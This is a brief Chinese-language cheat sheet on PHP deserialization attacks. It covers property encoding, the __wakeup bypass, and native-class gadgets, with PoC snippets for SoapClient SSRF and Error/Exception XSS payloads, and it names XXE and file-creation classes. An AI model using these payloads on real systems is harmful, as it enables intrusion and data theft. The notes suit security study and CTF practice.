# Unserialize

* ### 反序列化函数赋值

protected op --&gt; \00\*\00op

class Name{

private op --&gt; \00Name\00op

* ### \_\_wakeup 魔术方法绕过

更改序列化后变量个数使其超过真实变量个数完成绕过\_\_wakeup\(\)魔术方法

* ### php原生类的反序列化

使用情况：代码审计中存在反序列化点，但在进行反序列化的时候无法寻找到对应的pop链

序列化魔术方法：

```
当对象被创建的时候调用: __construct
当对象被销毁的时候调用: __destruct
当对象被当做一个字符串的时候调用（不仅仅是echo的时候,比如file_exists()判断也会触发): __toString
序列化对象之前就调用此方法(其返回需要是一个数组): __sleep
反序列化恢复对象之前就调用此方法: __wakeup
当调用对象中不存在的方法会自动调用此方法: __call
```

调用__call魔术方法的原生类：

SoapClient

* SSRF

  ```
  <?php
  $a = new SoapClient(null,array('uri'=>'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
  $b = serialize($a);
  echo $b;
  $c = unserialize($b);
  $c->a();
  ```

  仅限http与https协议

调用__toString魔术方法的原生类：

* Error（适用于php7）

  XSS（开启报错的情况下）

  ```
  <?php
  $a = new Error("<script>alert(1)</script>");
  $b = serialize($a);
  echo urlencode($b);
  ```

* Exception（适用于php5、7版本）

  XSS（开启报错的情况下）

  ```
  <?php
  $a = new Exception("<script>alert(1)</script>");
  $b = serialize($a);
  echo urlencode($b);
  ```

实例化任意类找__construct

```
获取目录：DirectoryIternator
XXE：SimpleXMLElement
创建空白文件：SQLite3
```



